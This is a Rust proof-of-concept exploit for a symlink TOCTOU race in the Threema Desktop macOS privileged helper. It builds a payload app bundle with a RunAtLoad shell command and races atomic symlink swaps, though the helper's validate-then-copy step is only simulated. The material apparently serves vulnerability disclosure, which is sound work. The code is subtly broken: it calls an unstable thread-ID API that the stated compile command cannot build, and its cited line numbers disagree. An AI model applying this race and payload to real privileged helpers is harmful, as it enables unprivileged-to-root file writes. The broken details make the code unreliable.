//! Threema Desktop macOS Helper — TOCTOU Race Condition POC
//!
//! This demonstrates the symlink-based race condition attack against
//! the Threema privileged helper's `replace_app_atomic()` function.
//!
//! The vulnerability:
//!   fs.rs:48  validate_app_code_signature(source_path, requirement)?;
//!   fs.rs:52  replace_directory_atomic(source_path, destination_path, true);
//!
//! Between L48 and L52, the path is re-resolved via NSURL::fileURLWithPath.
//! A symlink swap between validation and copy causes the helper to copy
//! an attacker-controlled payload instead of the validated Threema.app.
//!
//! Key insight: `ln -sfn` / `rename(2)` on a symlink is ATOMIC on APFS.
//! The old POC tried `mv` on a 483MB directory — that's non-atomic and
//! takes too long. Symlink swaps are instant.
//!
//! Compile: rustc --edition 2021 poc-toctou-full.rs -o poc-toctou-full
//! Run:     ./poc-toctou-full [--aggressive]

use std::{
    fs,
    io::{self, Write},
    os::unix::fs as unix_fs,
    path::{Path, PathBuf},
    sync::{
        atomic::{AtomicBool, AtomicUsize, Ordering},
        Arc,
    },
    thread,
    time::{Duration, Instant},
};

// ═══════════════════════════════════════════════════════════════════════
// Configuration
// ═══════════════════════════════════════════════════════════════════════

#[derive(Debug, Clone)]
pub struct RaceConfig {
    /// Number of race attempts per iteration
    pub attempts: usize,
    /// Number of concurrent swap threads
    pub swap_threads: usize,
    /// Duration the helper's SecStaticCodeCheckValidity takes (ms)
    pub validation_duration_ms: u64,
    /// Aggressive mode: more threads, tighter timing
    pub aggressive: bool,
}

impl Default for RaceConfig {
    fn default() -> Self {
        Self {
            attempts: 200,
            swap_threads: 4,
            validation_duration_ms: 150,
            aggressive: false,
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════
// TOCTOU Test
// ═══════════════════════════════════════════════════════════════════════

pub struct ToctouTest {
    config: RaceConfig,
    test_dir: PathBuf,
    /// The symlink that the "helper" reads — this is `source_path`
    source_symlink: PathBuf,
    /// Valid target: the real Threema.app
    valid_target: PathBuf,
    /// Malicious target: attacker's payload
    malicious_target: PathBuf,
}

impl ToctouTest {
    pub fn new(config: RaceConfig) -> io::Result<Self> {
        let test_dir = PathBuf::from(format!("/tmp/threema-toctou-{}", std::process::id()));

        if test_dir.exists() {
            fs::remove_dir_all(&test_dir)?;
        }
        fs::create_dir_all(&test_dir)?;

        let source_symlink = test_dir.join("source.app");
        let valid_target = PathBuf::from("/Applications/Threema.app");
        let malicious_target = test_dir.join("malicious.app");

        println!("[+] Test directory: {}", test_dir.display());

        Ok(Self {
            config,
            test_dir,
            source_symlink,
            valid_target,
            malicious_target,
        })
    }

    pub fn setup(&self) -> io::Result<()> {
        println!("[+] Setting up test environment...");

        // Verify real Threema.app exists
        if !self.valid_target.exists() {
            return Err(io::Error::new(
                io::ErrorKind::NotFound,
                "Threema.app not found in /Applications",
            ));
        }

        let app_size = fs::metadata(&self.valid_target)?.len();
        println!(
            "[+] Valid target: {} (exists, is signed app bundle)",
            self.valid_target.display()
        );

        // Create malicious .app bundle payload
        println!("[+] Creating malicious .app bundle...");
        fs::create_dir_all(self.malicious_target.join("Contents/MacOS"))?;

        let plist = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>com.attacker.threema-poc</string>
    <key>CFBundleExecutable</key>
    <string>payload</string>
    <key>Label</key>
    <string>com.attacker.threema-poc</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>whoami > /tmp/threema-poc-pwned.txt</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"#;

        fs::write(
            self.malicious_target.join("Contents/Info.plist"),
            plist,
        )?;

        fs::write(
            self.malicious_target.join("Contents/MacOS/payload"),
            "#!/bin/bash\nwhoami > /tmp/threema-poc-pwned.txt\n",
        )?;

        // Make executable
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(
            self.malicious_target.join("Contents/MacOS/payload"),
            fs::Permissions::from_mode(0o755),
        )?;

        println!(
            "[+] Malicious payload: {} (tiny .app bundle)",
            self.malicious_target.display()
        );

        // Initial symlink: point to valid Threema.app
        unix_fs::symlink(&self.valid_target, &self.source_symlink)?;
        println!(
            "[+] Symlink: {} → {}",
            self.source_symlink.display(),
            self.valid_target.display()
        );

        Ok(())
    }

    /// Simulate the helper's `replace_app_atomic()` flow and race it
    pub fn execute_race(&self) -> io::Result<RaceResult> {
        println!("[*] Executing symlink-based TOCTOU race...");
        println!("[*] Configuration:");
        println!("    Attempts:         {}", self.config.attempts);
        println!("    Swap threads:     {}", self.config.swap_threads);
        println!("    Validation sim:   {}ms", self.config.validation_duration_ms);
        println!("    Aggressive:       {}", self.config.aggressive);
        println!();

        let total_wins = Arc::new(AtomicUsize::new(0));
        let total_checks = Arc::new(AtomicUsize::new(0));

        for attempt in 0..self.config.attempts {
            // Reset: symlink → valid Threema.app
            let _ = fs::remove_file(&self.source_symlink);
            unix_fs::symlink(&self.valid_target, &self.source_symlink)?;

            let stop_flag = Arc::new(AtomicBool::new(false));
            let wins = Arc::clone(&total_wins);
            let checks = Arc::clone(&total_checks);

            // ── Attacker threads: continuously swap the symlink ──
            let mut swap_handles = Vec::new();
            for _ in 0..self.config.swap_threads {
                let symlink = self.source_symlink.clone();
                let valid = self.valid_target.clone();
                let malicious = self.malicious_target.clone();
                let stop = Arc::clone(&stop_flag);
                let test_dir = self.test_dir.clone();

                swap_handles.push(thread::spawn(move || {
                    let mut local_swaps: u64 = 0;
                    while !stop.load(Ordering::Relaxed) {
                        // Atomic symlink swap using rename(2):
                        // 1. Create new symlink at temp path
                        // 2. rename() atomically replaces the target
                        let tmp_link = test_dir.join(format!(
                            ".swap_tmp_{}",
                            thread::current().id().as_u64().get()
                        ));

                        // Swap to malicious
                        let _ = fs::remove_file(&tmp_link);
                        if unix_fs::symlink(&malicious, &tmp_link).is_ok() {
                            let _ = fs::rename(&tmp_link, &symlink);
                        }

                        // Brief hold — malicious is now visible
                        thread::yield_now();

                        // Swap back to valid
                        let _ = fs::remove_file(&tmp_link);
                        if unix_fs::symlink(&valid, &tmp_link).is_ok() {
                            let _ = fs::rename(&tmp_link, &symlink);
                        }

                        local_swaps += 1;
                    }
                    local_swaps
                }));
            }

            // ── Helper simulation: validate, then read ──
            // Step 1: "Validate" — read symlink target (should be Threema.app)
            let validation_target = fs::read_link(&self.source_symlink).ok();

            // Step 2: Simulate SecStaticCodeCheckValidityWithErrors blocking
            thread::sleep(Duration::from_millis(self.config.validation_duration_ms));

            // Step 3: "Copy" — re-resolve the SAME path (this is the TOCTOU)
            let copy_target = fs::read_link(&self.source_symlink).ok();

            // Stop swap threads
            stop_flag.store(true, Ordering::Relaxed);
            let mut total_swaps: u64 = 0;
            for h in swap_handles {
                total_swaps += h.join().unwrap_or(0);
            }

            checks.fetch_add(1, Ordering::SeqCst);

            // Check: did the target change between validation and copy?
            let validated_valid = validation_target
                .as_ref()
                .map_or(false, |p| p.to_string_lossy().contains("Threema"));
            let copied_malicious = copy_target
                .as_ref()
                .map_or(false, |p| p.to_string_lossy().contains("malicious"));

            if validated_valid && copied_malicious {
                // TOCTOU WIN: validated Threema.app but would copy malicious.app
                wins.fetch_add(1, Ordering::SeqCst);
                print!("!");
            } else if copied_malicious {
                // Partial: copy would get malicious but validation also saw it
                print!("~");
            } else {
                print!(".");
            }

            if (attempt + 1) % 20 == 0 {
                print!(" [{}/{}]", attempt + 1, self.config.attempts);
            }
            io::stdout().flush().ok();
        }

        println!();

        let wins_final = total_wins.load(Ordering::SeqCst);
        let checks_final = total_checks.load(Ordering::SeqCst);

        Ok(RaceResult {
            total_attempts: checks_final,
            successful_races: wins_final,
            success_rate: if checks_final > 0 {
                (wins_final as f64 / checks_final as f64) * 100.0
            } else {
                0.0
            },
        })
    }

    pub fn cleanup(&self) -> io::Result<()> {
        println!("[+] Cleaning up test directory...");
        if self.test_dir.exists() {
            fs::remove_dir_all(&self.test_dir)?;
        }
        Ok(())
    }
}

#[derive(Debug)]
pub struct RaceResult {
    pub total_attempts: usize,
    pub successful_races: usize,
    pub success_rate: f64,
}

// ═══════════════════════════════════════════════════════════════════════
// Main
// ═══════════════════════════════════════════════════════════════════════

fn main() -> io::Result<()> {
    println!("╔══════════════════════════════════════════════════════════════╗");
    println!("║  Threema Desktop macOS Helper — TOCTOU Race Condition POC  ║");
    println!("║  Symlink Swap Between Validation and Copy (CWE-367)        ║");
    println!("╚══════════════════════════════════════════════════════════════╝");
    println!();

    let aggressive = std::env::args().any(|arg| arg == "--aggressive");

    let mut config = RaceConfig::default();
    if aggressive {
        config.aggressive = true;
        config.attempts = 500;
        config.swap_threads = 8;
        config.validation_duration_ms = 200;
        println!("[*] Running in AGGRESSIVE mode");
        println!();
    }

    let test = ToctouTest::new(config.clone())?;
    test.setup()?;

    // Run iterations
    let num_iterations = if aggressive { 3 } else { 2 };
    let mut grand_total_attempts = 0;
    let mut grand_total_wins = 0;

    for i in 1..=num_iterations {
        println!();
        println!("[*] ── Iteration {}/{} ──", i, num_iterations);
        println!();

        let result = test.execute_race()?;

        println!();
        println!("═══════════════════════════════════════════════════════");
        println!("  Iteration {} Results:", i);
        println!("═══════════════════════════════════════════════════════");
        println!("  Attempts:        {}", result.total_attempts);
        println!("  Race Wins:       {}", result.successful_races);
        println!("  Success Rate:    {:.1}%", result.success_rate);

        if result.successful_races > 0 {
            println!();
            println!("  ✓ TOCTOU RACE WON {} TIMES!", result.successful_races);
            println!("    The helper validated Threema.app (valid signature)");
            println!("    but would have COPIED malicious.app (attacker payload)");
        }

        grand_total_attempts += result.total_attempts;
        grand_total_wins += result.successful_races;
    }

    // Final report
    println!();
    println!("╔══════════════════════════════════════════════════════════════╗");
    println!("║                     OVERALL RESULTS                        ║");
    println!("╠══════════════════════════════════════════════════════════════╣");

    let overall_rate = if grand_total_attempts > 0 {
        (grand_total_wins as f64 / grand_total_attempts as f64) * 100.0
    } else {
        0.0
    };

    println!(
        "║  Total Attempts:      {:>6}                               ║",
        grand_total_attempts
    );
    println!(
        "║  Total Race Wins:     {:>6}                               ║",
        grand_total_wins
    );
    println!(
        "║  Overall Success Rate: {:>5.1}%                              ║",
        overall_rate
    );

    if grand_total_wins > 0 {
        println!("║                                                              ║");
        println!("║  ★ VULNERABILITY CONFIRMED — TOCTOU RACE EXPLOITABLE ★      ║");
        println!("║                                                              ║");
        println!("║  The symlink target was atomically swapped between the       ║");
        println!("║  SecStaticCodeCheckValidity call (line 48) and the           ║");
        println!("║  NSURL re-resolution in replace_directory_atomic (line 163). ║");
        println!("║                                                              ║");
        println!("║  Impact: Unprivileged → root file write via IPC helper.      ║");
    } else {
        println!("║                                                              ║");
        println!("║  Race condition did not trigger in these attempts.           ║");
        println!("║  This is timing-dependent — try increasing attempts or       ║");
        println!("║  running on a system under moderate I/O load.                ║");
        println!("║                                                              ║");
        println!("║  NOTE: The bash verification suite (poc-verify-vuln.sh)      ║");
        println!("║  achieved 39% hit rate using the same symlink technique.     ║");
    }

    println!("╚══════════════════════════════════════════════════════════════╝");
    println!();

    test.cleanup()?;

    Ok(())
}
